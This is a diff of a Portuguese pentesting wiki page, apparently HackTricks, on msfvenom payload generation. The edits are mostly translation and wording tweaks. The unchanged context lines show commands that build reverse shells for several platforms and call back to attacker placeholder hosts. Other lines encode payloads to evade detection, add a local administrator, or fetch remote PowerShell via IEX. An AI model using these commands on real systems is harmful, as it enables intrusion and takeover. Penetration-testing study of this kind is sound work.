@@ -15,24 +15,24 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de bugs!
+Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) servidor para se comunicar com hackers experientes e caçadores de bugs!
 
 **Insights de Hacking**\
 Engaje-se com conteúdo que mergulha na emoção e nos desafios do hacking
 
-**Notícias de Hack em Tempo Real**\
-Mantenha-se atualizado com o mundo acelerado do hacking através de notícias e insights em tempo real
+**Notícias de Hacking em Tempo Real**\
+Mantenha-se atualizado com o mundo do hacking em ritmo acelerado através de notícias e insights em tempo real
 
 **Últimos Anúncios**\
-Fique informado sobre os novos programas de recompensas por bugs lançando e atualizações cruciais da plataforma
+Fique informado sobre os novos programas de bug bounty lançando e atualizações cruciais da plataforma
 
 **Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!
 
 ***
 
-## Básico do msfvenom
+## Básico msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
@@ -91,8 +91,6 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Obj
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
 ### Codificador
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
@@ -106,9 +104,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 ```
 {% endcode %}
 
-## Payloads Linux
+## Linux Payloads
 
-### Shell Reversa
+### Reverse Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -131,7 +129,7 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```
 {% endcode %}
 
-## **Payloads para MAC**
+## **Payloads MAC**
 
 ### **Shell Reversa:**
 
@@ -175,7 +173,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 ### JSP
 
-#### Reverse shell
+#### Shell reversa
 
 {% code overflow="wrap" %}
 ```bash
@@ -208,18 +206,20 @@ msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > 
 {% endcode %}
 
 ### **Python**
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
+{% endcode %}
+
 ### **Bash**
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de bugs!
 
@@ -230,7 +230,7 @@ Engaje-se com conteúdo que explora a emoção e os desafios do hacking
 Mantenha-se atualizado com o mundo do hacking em ritmo acelerado através de notícias e insights em tempo real
 
 **Últimos Anúncios**\
-Fique informado sobre as novas recompensas por bugs que estão sendo lançadas e atualizações cruciais da plataforma
+Fique informado sobre os novos programas de recompensas por bugs que estão sendo lançados e atualizações cruciais da plataforma
 
 **Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!
 
